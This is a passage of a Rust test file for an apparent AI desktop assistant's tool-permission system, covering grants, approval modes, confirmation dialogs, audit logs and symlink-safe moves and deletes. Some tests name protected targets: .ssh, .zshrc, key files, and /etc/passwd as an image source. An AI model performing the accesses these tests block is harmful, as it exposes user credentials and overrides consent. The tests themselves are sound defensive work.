    }

    #[test]
    fn propose_audits_unknown_profile() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let err = propose(
            &dir,
            &st,
            "bogus",
            None,
            &ToolAction::ReadFile {
                path: "/tmp/x".into(),
            },
        )
        .expect_err("protocol");
        assert_eq!(err.kind, "protocol");
        let entries = audit::tail(&dir, 10).expect("tail");
        let last = entries.last().expect("rejection must be audited");
        assert_eq!(last.event, "propose");
        assert_eq!(last.outcome, "rejected");
        assert_eq!(last.profile_id.as_deref(), Some("bogus"));
    }

    // ------------------------------ native confirmation (every action) --

    #[test]
    fn every_action_kind_has_a_plain_confirmation_naming_its_target() {
        let cases = [
            ToolAction::ReadFile {
                path: "/u/doc.txt".into(),
            },
            ToolAction::ListFiles {
                path: "/u/doc.txt".into(),
            },
            ToolAction::WriteFile {
                path: "/u/doc.txt".into(),
                content: "SECRET-CONTENT".into(),
            },
            ToolAction::ReplaceFile {
                path: "/u/doc.txt".into(),
                old: "SECRET-CONTENT".into(),
                new: "y".into(),
            },
            ToolAction::RunCommand {
                cmd: "ls -la".into(),
                cwd_in_grant: "/u/doc.txt".into(),
            },
        ];
        for action in &cases {
            let (title, text) = confirmation_text(action, "+1 −0 lines", None);
            assert!(!title.is_empty());
            assert!(text.contains("/u/doc.txt"), "target shown: {text}");
            assert!(text.contains("¿Se lo permites?"));
            // Without a diff, no content is ever echoed into the dialog.
            assert!(!text.contains("SECRET-CONTENT"));
        }
        let (_, run) = confirmation_text(&cases[4], "", None);
        assert!(run.contains("ls -la"), "the exact command is shown");
    }

    #[test]
    fn write_confirmations_preview_a_bounded_change() {
        let diff = std::iter::once("--- a\n+++ b\n@@ -1 +1 @@".to_string())
            .chain((0..40).map(|i| format!("+line {i}")))
            .collect::<Vec<_>>()
            .join("\n");
        let action = ToolAction::WriteFile {
            path: "/u/a.md".into(),
            content: String::new(),
        };
        let (_, text) = confirmation_text(&action, "", Some(&diff));
        assert!(text.contains("Cambios:"));
        assert!(text.contains("+line 0"));
        assert!(!text.contains("+line 39"), "preview is bounded");
        assert!(!text.contains("+++ b"), "file headers are not shown");
        assert!(text.ends_with('…'));
    }

    // ------------------------------------------ computer-wide mode --

    /// App data INSIDE the stand-in $HOME (like macOS), with a computer-wide
    /// grant rooted at that $HOME saved into the app data dir.
    fn computer_wide_layout() -> (PathBuf, PathBuf, tempfile::TempDir) {
        let tmp = tempfile::tempdir().expect("tempdir");
        let home = canon(tmp.path()).join("home");
        let app_data = home.join("Library").join("app-data");
        fs::create_dir_all(&app_data).expect("app data");
        let mut store = grants::default_store();
        store.add_computer_wide_grant("cw".into(), "nan", home.clone(), "t".into());
        grants::save(&app_data, &store).expect("save");
        (home, app_data, tmp)
    }

    #[test]
    fn computer_wide_grant_reaches_home_but_never_the_app_data() {
        let (home, app_data, _guard) = computer_wide_layout();
        fs::write(home.join("notes.txt"), "hola").expect("write");
        let st = state();
        // Anywhere under $HOME is proposable…
        let proposal = propose(
            &app_data,
            &st,
            "nan",
            None,
            &ToolAction::ReadFile {
                path: home.join("notes.txt").display().to_string(),
            },
        )
        .expect("home file is in scope");
        let outcome = execute(&app_data, &st, &proposal.id).expect("executes");
        assert_eq!(outcome.content.as_deref(), Some("hola"));
        // …but the app's own data (tool policy, audit log, chat DB) is not.
        for target in [app_data.join("tools.json"), app_data.clone()] {
            let err = propose(
                &app_data,
                &st,
                "nan",
                None,
                &ToolAction::ReadFile {
                    path: target.display().to_string(),
                },
            )
            .expect_err("app data is protected");
            assert_eq!(err.kind, "scope");
        }
        let err = propose(
            &app_data,
            &st,
            "nan",
            None,
            &ToolAction::WriteFile {
                path: app_data.join("tools.json").display().to_string(),
                content: "{}".into(),
            },
        )
        .expect_err("policy rewrite refused");
        assert_eq!(err.kind, "scope");
    }

    #[test]
    fn workspace_reports_roots_and_modes_per_profile() {
        let (home, _app_data, _guard) = computer_wide_layout();
        let mut store = grants::default_store();
        assert_eq!(workspace_from_store(&store, "nan"), None);
        store.add_computer_wide_grant("cw".into(), "nan", home.clone(), "t".into());
        store.set_run_command_enabled(true);
        let ws = workspace_from_store(&store, "nan").expect("workspace");
        assert_eq!(ws.roots, vec![home]);
        assert!(ws.computer_wide);
        assert!(ws.run_command);
        assert_eq!(workspace_from_store(&store, "helmcode"), None);
    }

    // ------------------------------------- S13/S14 approval routing --

    use std::sync::atomic::{AtomicUsize, Ordering};

    /// Records every prompt; answers all of them with `answer`.
    struct FakeApprover {
        answer: bool,
        native_calls: AtomicUsize,
        inline_calls: Mutex<Vec<ApprovalRequest>>,
    }

    impl FakeApprover {
        fn answering(answer: bool) -> Self {
            FakeApprover {
                answer,
                native_calls: AtomicUsize::new(0),
                inline_calls: Mutex::new(Vec::new()),
            }
        }
        fn prompts(&self) -> (usize, usize) {
            (
                self.native_calls.load(Ordering::SeqCst),
                self.inline_calls.lock().expect("lock").len(),
            )
        }
    }

    impl Approver for FakeApprover {
        fn native(&self, _title: String, _text: String) -> impl Future<Output = bool> + Send {
            self.native_calls.fetch_add(1, Ordering::SeqCst);
            let answer = self.answer;
            async move { answer }
        }
        fn inline(&self, request: ApprovalRequest) -> impl Future<Output = bool> + Send {
            self.inline_calls.lock().expect("lock").push(request);
            let answer = self.answer;
            async move { answer }
        }
    }

    /// propose → approve (by route) → execute, like `run_model_action`.
    fn run_with(
        dir: &Path,
        st: &ToolsState,
        approver: &FakeApprover,
        action: &ToolAction,
    ) -> Result<(ApprovalRoute, ToolOutcome), Rejection> {
        let proposal = propose(dir, st, "nan", Some(1), action)?;
        let route = tauri::async_runtime::block_on(approve_proposal(dir, st, approver, &proposal))?;
        let outcome = execute(dir, st, &proposal.id)?;
        Ok((route, outcome))
    }

    fn set_grant_mode(dir: &Path, grant_id: &str, mode: ApprovalMode) {
        let mut store = grants::load_or_seed(dir).expect("load");
        store.set_mode(grant_id, mode).expect("set mode");
        grants::save(dir, &store).expect("save");
    }

    fn path_str(path: &Path) -> String {
        path.display().to_string()
    }

    #[test]
    fn allow_mode_runs_every_covered_action_without_a_prompt() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        set_grant_mode(&dir, "g1", ApprovalMode::Allow);
        let st = state();
        // An approver that would DENY everything: allow mode must never ask.
        let approver = FakeApprover::answering(false);
        let actions = [
            ToolAction::WriteFile {
                path: path_str(&root.join("a.txt")),
                content: "uno".into(),
            },
            ToolAction::ReadFile {
                path: path_str(&root.join("a.txt")),
            },
            ToolAction::ListFiles {
                path: path_str(&root),
            },
            ToolAction::ReplaceFile {
                path: path_str(&root.join("a.txt")),
                old: "uno".into(),
                new: "dos".into(),
            },
            ToolAction::MovePath {
                from: path_str(&root.join("a.txt")),
                to: path_str(&root.join("b.txt")),
                overwrite: false,
            },
            ToolAction::DeletePath {
                path: path_str(&root.join("b.txt")),
            },
        ];
        for action in &actions {
            let (route, _) = run_with(&dir, &st, &approver, action)
                .unwrap_or_else(|err| panic!("{} failed: {err:?}", action.kind()));
            assert_eq!(
                route,
                ApprovalRoute::Auto,
                "{} must not prompt",
                action.kind()
            );
        }
        assert_eq!(approver.prompts(), (0, 0), "no prompt of any kind");
        assert!(!root.join("a.txt").exists() && !root.join("b.txt").exists());
        // The auto approvals are audited as such.
        let auto = audit::tail(&dir, 200)
            .expect("audit")
            .into_iter()
            .filter(|e| {
                e.event == "approve"
                    && e.detail
                        .as_deref()
                        .is_some_and(|d| d.contains("allow mode"))
            })
            .count();
        assert_eq!(auto, actions.len());
    }

    #[test]
    fn ask_mode_prompts_inline_and_a_deny_executes_nothing() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let approver = FakeApprover::answering(false);
        let target = root.join("nuevo.txt");
        let proposal = propose(
            &dir,
            &st,
            "nan",
            Some(7),
            &ToolAction::WriteFile {
                path: path_str(&target),
                content: "hola".into(),
            },
        )
        .expect("propose");
        let err = tauri::async_runtime::block_on(approve_proposal(&dir, &st, &approver, &proposal))
            .expect_err("declined");
        assert_eq!(err.kind, "declined");
        assert_eq!(
            approver.prompts(),
            (0, 1),
            "one inline card, no native dialog"
        );
        let request = approver.inline_calls.lock().expect("lock")[0].clone();
        assert_eq!(request.action, "write_file");
        assert_eq!(request.conversation_id, Some(7));
        assert_eq!(request.path.as_deref(), Some(path_str(&target).as_str()));
        assert!(
            request.diff_preview.is_some(),
            "the card previews the change"
        );
        // The declined proposal is gone: it can never be executed later.
        assert_eq!(
            execute(&dir, &st, &proposal.id).expect_err("consumed").kind,
            "unknown_proposal"
        );
        assert!(!target.exists());

        // Granting in ask mode executes, still through the inline card.
        let approver = FakeApprover::answering(true);
        let (route, _) = run_with(
            &dir,
            &st,
            &approver,
            &ToolAction::WriteFile {
                path: path_str(&target),
                content: "hola".into(),
            },
        )
        .expect("granted");
        assert_eq!(route, ApprovalRoute::Inline);
        assert_eq!(fs::read_to_string(&target).expect("written"), "hola");
    }

    #[test]
    fn computer_wide_always_uses_the_native_dialog_whatever_the_mode() {
        let (home, app_data, _guard) = computer_wide_layout();
        fs::write(home.join("notes.txt"), "hola").expect("write");
        // Even a hand-edited store claiming allow cannot skip the dialog.
        let mut store = grants::load_or_seed(&app_data).expect("load");
        store.grants[0].mode = ApprovalMode::Allow;
        grants::save(&app_data, &store).expect("save");
        let st = state();
        let approver = FakeApprover::answering(true);
        let (route, outcome) = run_with(
            &app_data,
            &st,
            &approver,
            &ToolAction::ReadFile {
                path: path_str(&home.join("notes.txt")),
            },
        )
        .expect("read");
        assert_eq!(route, ApprovalRoute::Native);
        assert_eq!(approver.prompts(), (1, 0));
        assert_eq!(outcome.content.as_deref(), Some("hola"));
    }

    #[test]
    fn allow_mode_never_unlocks_the_deny_list_or_protected_targets() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::write(root.join(".zshrc"), "export X=1").expect("zshrc");
        fs::write(root.join("server.pem"), "key").expect("pem");
        let (dir, _guard2) = granted_dir(&folder);
        set_grant_mode(&dir, "g1", ApprovalMode::Allow);
        let st = state();
        let approver = FakeApprover::answering(true);
        for action in [
            ToolAction::WriteFile {
                path: path_str(&root.join("id.key")),
                content: "x".into(),
            },
            ToolAction::DeletePath {
                path: path_str(&root.join(".zshrc")),
            },
            ToolAction::MovePath {
                from: path_str(&root.join("server.pem")),
                to: path_str(&root.join("server.txt")),
                overwrite: false,
            },
            ToolAction::MovePath {
                from: path_str(&root.join("server.pem")),
                to: path_str(&root.join(".bashrc")),
                overwrite: false,
            },
            ToolAction::DeletePath {
                path: path_str(&root),
            },
        ] {
            let err = run_with(&dir, &st, &approver, &action).expect_err("refused");
            assert_eq!(err.kind, "scope", "{}: {err:?}", action.kind());
        }
        assert_eq!(approver.prompts(), (0, 0), "refused before any prompt");
        assert!(root.join(".zshrc").exists() && root.join("server.pem").exists());
        assert!(!root.join("id.key").exists());
    }

    // ------------------------ round 6: generate_image save_path --

    const FAKE_PNG: &[u8] = b"\x89PNG\r\n\x1a\nround6";

    /// A file exactly where the image tool saves: `<app data>/images/<uuid>.png`.
    fn generated_image(dir: &Path) -> PathBuf {
        let images = crate::images::images_dir(dir);
        fs::create_dir_all(&images).expect("images dir");
        let path = images.join(format!("{}.png", uuid::Uuid::new_v4()));
        fs::write(&path, FAKE_PNG).expect("png");
        canon(&path)
    }

    /// A state whose session temp folders live in a test tempdir.
    fn state_with_scratch(base: &Path) -> ToolsState {
        let mut st = state();
        st.scratch_base = base.to_path_buf();
        st
    }

    fn save_image(
        dir: &Path,
        st: &ToolsState,
        approver: &FakeApprover,
        source: &Path,
        save_path: &str,
    ) -> ImageSave {
        tauri::async_runtime::block_on(save_generated_image(
            dir, st, approver, "nan", 1, source, save_path,
        ))
    }

    #[test]
    fn save_image_inside_an_allow_grant_copies_without_a_prompt() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::create_dir_all(root.join("art")).expect("art");
        let (dir, _guard2) = granted_dir(&folder);
        set_grant_mode(&dir, "g1", ApprovalMode::Allow);
        let (scratch, _guard3) = tempdir();
        let st = state_with_scratch(&scratch);
        let source = generated_image(&dir);
        // An approver that would deny: allow mode must never ask.
        let approver = FakeApprover::answering(false);
        let dest = root.join("art").join("zorro.png");
        let save = save_image(&dir, &st, &approver, &source, &path_str(&dest));
        let ImageSave::Saved(outcome) = &save else {
            panic!("expected Saved, got {save:?}");
        };
        assert_eq!(outcome.produced, vec![path_str(&dest)]);
        assert_eq!(save.saved_path(), Some(path_str(&dest).as_str()));
        assert_eq!(fs::read(&dest).expect("saved"), FAKE_PNG);
        assert!(source.exists(), "the chat keeps its inline copy");
        assert_eq!(approver.prompts(), (0, 0));
        let report = image_save_for_model(&save);
        assert_eq!(report["saved"], true);
        assert_eq!(report["saved_to"], path_str(&dest));
        // A folder save_path keeps the generated file name; an extension-less
        // name gets `.png`.
        let save = save_image(&dir, &st, &approver, &source, &path_str(&root));
        let into_folder = root.join(source.file_name().expect("name"));
        assert_eq!(save.saved_path(), Some(path_str(&into_folder).as_str()));
        let save = save_image(&dir, &st, &approver, &source, &path_str(&root.join("logo")));
        assert_eq!(
            save.saved_path(),
            Some(path_str(&root.join("logo.png")).as_str())
        );
    }

    #[test]
    fn save_image_keeps_the_generated_images_own_format() {
        // FLUX answers JPEG: the image is saved as `<uuid>.jpg`, and the
        // copy (bytes as they are) must never be named `.png`.
        const FAKE_JPEG: &[u8] = b"\xFF\xD8\xFF\xE0round6";
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        set_grant_mode(&dir, "g1", ApprovalMode::Allow);
        let (scratch, _guard3) = tempdir();
        let st = state_with_scratch(&scratch);
        let images = crate::images::images_dir(&dir);
        fs::create_dir_all(&images).expect("images dir");
        let source = images.join(format!("{}.jpg", uuid::Uuid::new_v4()));
        fs::write(&source, FAKE_JPEG).expect("jpg");
        let source = canon(&source);
        let approver = FakeApprover::answering(false);
        for (asked, saved) in [
            ("zorro.png", "zorro.jpg"),
            ("zorro.jpeg", "zorro.jpeg"),
            ("zorro.jpg", "zorro.jpg"),
            ("zorro", "zorro.jpg"),
        ] {
            let save = save_image(&dir, &st, &approver, &source, &path_str(&root.join(asked)));
            assert_eq!(
                save.saved_path(),
                Some(path_str(&root.join(saved)).as_str()),
                "{asked}"
            );
            assert_eq!(fs::read(root.join(saved)).expect("saved"), FAKE_JPEG);
        }
        // A folder keeps the generated `<uuid>.jpg` name.
        let save = save_image(&dir, &st, &approver, &source, &path_str(&root));
        let into_folder = root.join(source.file_name().expect("name"));
        assert_eq!(save.saved_path(), Some(path_str(&into_folder).as_str()));
        // And a PNG asked as `.jpg` is saved as `.png`.
        let png = generated_image(&dir);
        let save = save_image(
            &dir,
            &st,
            &approver,
            &png,
            &path_str(&root.join("logo.jpg")),
        );
        assert_eq!(
            save.saved_path(),
            Some(path_str(&root.join("logo.png")).as_str())
        );
    }

    #[test]
    fn save_image_in_ask_mode_shows_the_destination_and_a_deny_saves_nothing() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        let (scratch, _guard3) = tempdir();
        let st = state_with_scratch(&scratch);
        let source = generated_image(&dir);
        let approver = FakeApprover::answering(false);
        let dest = root.join("zorro.png");
        let save = save_image(&dir, &st, &approver, &source, &path_str(&dest));
        let ImageSave::Failed {
            outside, rejection, ..
        } = &save
        else {
            panic!("expected Failed, got {save:?}");
        };
        assert!(!outside);
        assert_eq!(rejection.kind, "declined");
        assert!(!dest.exists(), "a declined save writes nothing");
        let requests = approver.inline_calls.lock().expect("lock");
        assert_eq!(requests.len(), 1, "ask mode shows the inline card");
        assert_eq!(requests[0].action, "save_image");
        assert_eq!(requests[0].path.as_deref(), Some(path_str(&dest).as_str()));
        assert!(requests[0].text.contains(&path_str(&dest)));
        drop(requests);
        assert_eq!(image_save_for_model(&save)["saved"], false);
        // Approved: the copy lands.
        let approver = FakeApprover::answering(true);
        let save = save_image(&dir, &st, &approver, &source, &path_str(&dest));
        assert!(matches!(save, ImageSave::Saved(_)), "{save:?}");
        assert_eq!(fs::read(&dest).expect("saved"), FAKE_PNG);
        // Replacing an existing file is stated on the card.
        let _ = save_image(&dir, &st, &approver, &source, &path_str(&dest));
        let requests = approver.inline_calls.lock().expect("lock");
        assert!(requests[1].summary.contains("replaces the existing file"));
        assert!(requests[1].text.contains("SUSTITUIRÁ"));
    }

    #[test]
    fn save_image_honors_the_deny_list_and_protected_targets_in_allow_mode() {
        // The sensitive write deny-list covers save_image like write_file.
        if let Some(home) = std::env::home_dir() {
            let action = ToolAction::SaveImage {
                source: "/x.png".into(),
                path: path_str(&home.join(".ssh").join("x.png")),
            };
            let err = reject_sensitive_write(&action, &home.join(".ssh").join("x.png"))
                .expect_err("deny-listed");
            assert_eq!(err.kind, "scope");
        }
        // The app's own data stays off limits even under a computer-wide
        // grant that covers it, before any prompt.
        let (home, app_data, _guard) = computer_wide_layout();
        let (scratch, _guard2) = tempdir();
        let st = state_with_scratch(&scratch);
        let source = generated_image(&app_data);
        let approver = FakeApprover::answering(true);
        let target = app_data.join("images").join("copy.png");
        let save = save_image(&app_data, &st, &approver, &source, &path_str(&target));
        let ImageSave::Failed { rejection, .. } = &save else {
            panic!("expected Failed, got {save:?}");
        };
        assert_eq!(rejection.kind, "scope");
        assert!(!target.exists());
        assert_eq!(approver.prompts(), (0, 0), "refused before any prompt");
        // A non-image name is refused rather than silently renamed.
        let save = save_image(
            &app_data,
            &st,
            &approver,
            &source,
            &path_str(&home.join("a.txt")),
        );
        let ImageSave::Failed { rejection, .. } = &save else {
            panic!("expected Failed, got {save:?}");
        };
        assert_eq!(rejection.kind, "protocol");
    }

    #[test]
    fn save_image_outside_every_grant_falls_back_to_the_session_temp_folder_with_an_approval() {
        let (folder, _guard) = tempdir();
        let (dir, _guard2) = granted_dir(&folder);
        // Even an allow-mode grant elsewhere never auto-approves the fallback.
        set_grant_mode(&dir, "g1", ApprovalMode::Allow);
        let (scratch, _guard3) = tempdir();
        let st = state_with_scratch(&scratch);
        let source = generated_image(&dir);
        let (elsewhere, _guard4) = tempdir();
        let requested = canon(&elsewhere).join("zorro.png");

        let approver = FakeApprover::answering(true);
        let save = save_image(&dir, &st, &approver, &source, &path_str(&requested));
        let ImageSave::SavedToTemp {
            requested: asked,
            outcome,
        } = &save
        else {
            panic!("expected SavedToTemp, got {save:?}");
        };
        let temp_target = canon(&st.scratch_dir(1)).join("zorro.png");
        assert_eq!(asked, &path_str(&requested));
        assert_eq!(outcome.produced, vec![path_str(&temp_target)]);
        assert_eq!(fs::read(&temp_target).expect("temp copy"), FAKE_PNG);
        assert!(!requested.exists(), "nothing lands outside the grants");
        assert_eq!(
            approver.prompts(),
            (0, 1),
            "the fallback always asks inline"
        );
        let card = approver.inline_calls.lock().expect("lock")[0].clone();
        assert_eq!(card.path.as_deref(), Some(path_str(&temp_target).as_str()));
        let report = image_save_for_model(&save);
        assert_eq!(report["saved"], true);
        assert_eq!(report["requested_path"], path_str(&requested));
        assert!(
            report["message"]
                .as_str()
                .is_some_and(|m| m.contains("ask them to add that folder")),
            "the model is told to ask for the folder: {report}"
        );

        // Declined: nothing is saved anywhere and the model still learns why.
        fs::remove_file(&temp_target).expect("reset");
        let approver = FakeApprover::answering(false);
        let save = save_image(&dir, &st, &approver, &source, &path_str(&requested));
        assert!(
            matches!(&save, ImageSave::Failed { outside: true, .. }),
            "{save:?}"
        );
        assert!(!temp_target.exists() && !requested.exists());
        assert!(
            image_save_for_model(&save)["message"]
                .as_str()
                .is_some_and(|m| m.contains("ask them to add that folder"))
        );
    }

    #[test]
    fn save_image_is_core_built_only_and_copies_only_generated_images() {
        // The renderer can never construct the action (no arbitrary source).
        let err = parse_action(r#"{"type":"save_image","source":"/etc/passwd","path":"/a.png"}"#)
            .expect_err("never deserialized");
        assert_eq!(err.kind, "unknown_action");
        // A source outside `app_data/images` is refused, even in a grant.
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::write(root.join("secret.png"), "x").expect("secret");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let err = propose(
            &dir,
            &st,
            "nan",
            Some(1),
            &ToolAction::SaveImage {
                source: path_str(&root.join("secret.png")),
                path: path_str(&root.join("copy.png")),
            },
        )
        .expect_err("not a generated image");
        assert_eq!(err.kind, "scope");
        assert!(!root.join("copy.png").exists());
    }

    #[cfg(unix)]
    #[test]
    fn run_command_asks_unless_its_cwd_is_in_an_allow_grant() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::create_dir_all(root.join("ask-sub")).expect("sub");
        let (dir, _guard2) = granted_dir(&folder);
        // A nested ask-mode grant inside the allow-mode one.
        let mut store = grants::load_or_seed(&dir).expect("load");
        store
            .add_grant("g2".into(), "nan", root.join("ask-sub"), "t".into())
            .expect("nested");
        store.set_mode("g1", ApprovalMode::Allow).expect("allow");
        grants::save(&dir, &store).expect("save");
        let st = state();
        let approver = FakeApprover::answering(true);
        let (route, outcome) = run_with(
            &dir,
            &st,
            &approver,
            &ToolAction::RunCommand {
                cmd: "echo hi".into(),
                cwd_in_grant: path_str(&root),
            },
        )
        .expect("allow cwd");
        assert_eq!(route, ApprovalRoute::Auto);
        assert_eq!(outcome.stdout.as_deref(), Some("hi\n"));
        let (route, _) = run_with(
            &dir,
            &st,
            &approver,
            &ToolAction::RunCommand {
                cmd: "echo hi".into(),
                cwd_in_grant: path_str(&root.join("ask-sub")),
            },
        )
        .expect("ask cwd");
        assert_eq!(route, ApprovalRoute::Inline, "cwd in an ask grant asks");
        let request = approver.inline_calls.lock().expect("lock")[0].clone();
        assert_eq!(request.command.as_deref(), Some("echo hi"));
    }

    // ------------------------------------------------------- move_path --

    #[test]
    fn move_path_renames_and_overwrites_only_when_asked() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::write(root.join("a.txt"), "A").expect("a");
        fs::write(root.join("b.txt"), "B").expect("b");
        fs::create_dir_all(root.join("dir/inner")).expect("dir");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let mv = |from: &Path, to: &Path, overwrite: bool| ToolAction::MovePath {
            from: path_str(from),
            to: path_str(to),
            overwrite,
        };
        // Existing destination without the flag: refused, nothing changes.
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &mv(&root.join("a.txt"), &root.join("b.txt"), false),
        )
        .expect_err("exists");
        assert_eq!(err.kind, "exists");
        // With the flag: replaced, and the summary says so.
        let proposal = propose_ok(
            &dir,
            &st,
            &mv(&root.join("a.txt"), &root.join("b.txt"), true),
        );
        assert!(proposal.summary.contains("replaces the existing file"));
        let (_, text) = confirmation_text(&proposal.action, &proposal.summary, None);
        assert!(
            text.contains("SUSTITUIRÁ"),
            "the overwrite is explicit: {text}"
        );
        execute(&dir, &st, &proposal.id).expect("move");
        assert!(!root.join("a.txt").exists());
        assert_eq!(fs::read_to_string(root.join("b.txt")).expect("b"), "A");
        // Plain rename into a subfolder.
        let proposal = propose_ok(
            &dir,
            &st,
            &mv(&root.join("b.txt"), &root.join("dir/c.txt"), false),
        );
        execute(&dir, &st, &proposal.id).expect("rename");
        assert!(root.join("dir/c.txt").exists());
        // A folder can never be moved inside itself, nor overwrite anything.
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &mv(&root.join("dir"), &root.join("dir/inner/x"), false),
        )
        .expect_err("into itself");
        assert_eq!(err.kind, "protocol");
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &mv(&root.join("dir/c.txt"), &root.join("dir/inner"), true),
        )
        .expect_err("over a folder");
        assert_eq!(err.kind, "protocol");
        // Missing destination folder.
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &mv(&root.join("dir/c.txt"), &root.join("nope/c.txt"), false),
        )
        .expect_err("no parent");
        assert_eq!(err.kind, "not_found");
    }

    #[test]
    fn move_path_keeps_both_ends_inside_granted_scope() {
        let (folder, _guard) = tempdir();
        let (outside, _guard3) = tempdir();
        let root = canon(&folder);
        let outside = canon(&outside);
        fs::write(root.join("a.txt"), "A").expect("a");
        fs::write(outside.join("o.txt"), "O").expect("o");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::MovePath {
                from: path_str(&root.join("a.txt")),
                to: path_str(&outside.join("a.txt")),
                overwrite: false,
            },
        )
        .expect_err("dest outside");
        assert_eq!(err.kind, "escape");
        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::MovePath {
                from: path_str(&outside.join("o.txt")),
                to: path_str(&root.join("o.txt")),
                overwrite: false,
            },
        )
        .expect_err("source outside");
        assert_eq!(err.kind, "escape");
        assert!(root.join("a.txt").exists() && outside.join("o.txt").exists());
    }

    #[cfg(unix)]
    #[test]
    fn move_path_and_delete_path_are_symlink_safe() {
        let (folder, _guard) = tempdir();
        let (outside, _guard3) = tempdir();
        let root = canon(&folder);
        let outside = canon(&outside);
        fs::write(root.join("real.txt"), "R").expect("real");
        fs::write(outside.join("victim.txt"), "V").expect("victim");
        std::os::unix::fs::symlink(root.join("real.txt"), root.join("link.txt")).expect("link");
        std::os::unix::fs::symlink(outside.join("later"), root.join("blink")).expect("dangling");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        // A symlink leaf is never moved or deleted (its target would be).
        for action in [
            ToolAction::DeletePath {
                path: path_str(&root.join("link.txt")),
            },
            ToolAction::MovePath {
                from: path_str(&root.join("link.txt")),
                to: path_str(&root.join("moved.txt")),
                overwrite: false,
            },
        ] {
            let err = propose(&dir, &st, "nan", None, &action).expect_err("symlink leaf");
            assert_eq!(err.kind, "symlink", "{}", action.kind());
        }
        assert_eq!(
            fs::read_to_string(root.join("real.txt")).expect("intact"),
            "R"
        );
        // A destination through a dangling intermediate symlink is refused
        // and nothing materializes outside the grant.
        let result = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::MovePath {
                from: path_str(&root.join("real.txt")),
                to: path_str(&root.join("blink").join("x.txt")),
                overwrite: false,
            },
        )
        .and_then(|proposal| execute(&dir, &st, &proposal.id));
        assert!(result.is_err(), "dangling intermediate refused: {result:?}");
        assert!(!outside.join("later").exists());
        assert!(root.join("real.txt").exists());
    }

    // ----------------------------------------------------- delete_path --

    #[test]
    fn delete_path_removes_files_and_folders_and_states_permanence() {
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        fs::write(root.join("viejo.txt"), "x").expect("file");
        fs::create_dir_all(root.join("build/deep")).expect("dir");
        fs::write(root.join("build/deep/out.o"), "o").expect("nested");
        let (dir, _guard2) = granted_dir(&folder);
        let st = state();
        // Tests have no trash (never the developer's real one): permanent,
        // and the summary, the card and the dialog all say so.
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::DeletePath {
                path: path_str(&root.join("viejo.txt")),
            },
        );
        assert!(proposal.permanent_delete);
        assert!(
            proposal.summary.contains("PERMANENT"),
            "{}",
            proposal.summary
        );
        assert!(!proposal.summary.contains('—'), "no em-dash in UI copy");
        let request = approval_request(&proposal);
        assert!(request.permanent);
        assert!(request.text.contains("DEFINITIVAMENTE"));
        let outcome = execute(&dir, &st, &proposal.id).expect("delete file");
        assert!(outcome.summary.contains("permanently"));
        assert!(!root.join("viejo.txt").exists());

        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::DeletePath {
                path: path_str(&root.join("build")),
            },
        );
        assert!(
            proposal.summary.contains("folder with 2 entries"),
            "{}",
            proposal.summary
        );
        execute(&dir, &st, &proposal.id).expect("delete folder");
        assert!(!root.join("build").exists());

        let err = propose(
            &dir,
            &st,
            "nan",
            None,
            &ToolAction::DeletePath {
                path: path_str(&root.join("missing.txt")),
            },
        )
        .expect_err("missing");
        assert_eq!(err.kind, "not_found");
    }

    #[test]
    fn trash_delete_confirmation_promises_recovery() {
        let action = ToolAction::DeletePath {
            path: "/u/a.txt".into(),
        };
        let (_, text) = confirmation_text(
            &action,
            "delete_path /u/a.txt (file, 1 bytes; moved to the trash)",
            None,
        );
        assert!(text.contains("papelera"));
        assert!(!text.contains("DEFINITIVAMENTE"));
    }

    #[test]
    fn delete_rechecks_protection_at_execute() {
        // A stored proposal for a grant root (impossible through propose)
        // is still refused at execute: defense in depth.
        let (folder, _guard) = tempdir();
        let root = canon(&folder);
        let (dir, _guard2) = granted_dir(&folder);
        let proposal = PendingProposal {
            id: "p-root".into(),
            profile_id: "nan".into(),
            conversation_id: None,
            action: ToolAction::DeletePath {
                path: path_str(&root),
            },
            summary: "delete_path".into(),
            diff: None,
            grant_id: Some("g1".into()),
            canonical_path: Some(root.clone()),
            dest_grant_id: None,
            dest_path: None,
            permanent_delete: true,
            created_at: std::time::Instant::now(),
        };
        let err = execute_proposal(&dir, &proposal).expect_err("refused");
        assert_eq!(err.kind, "scope");
        assert!(root.exists());
    }

    #[test]
    fn approval_route_requires_allow_on_both_ends_of_a_move() {
        let (folder, _guard) = tempdir();
        let (other, _guard3) = tempdir();
        let root = canon(&folder);
        let other_root = canon(&other);
        fs::write(root.join("a.txt"), "A").expect("a");
        let (dir, _guard2) = granted_dir(&folder);
        let mut store = grants::load_or_seed(&dir).expect("load");
        store
            .add_grant("g2".into(), "nan", other_root.clone(), "t".into())
            .expect("g2");
        store.set_mode("g1", ApprovalMode::Allow).expect("allow g1");
        grants::save(&dir, &store).expect("save");
        let st = state();
        let proposal = propose_ok(
            &dir,
            &st,
            &ToolAction::MovePath {
                from: path_str(&root.join("a.txt")),
                to: path_str(&other_root.join("a.txt")),
                overwrite: false,
            },
        );
        let store = grants::load_or_seed(&dir).expect("load");
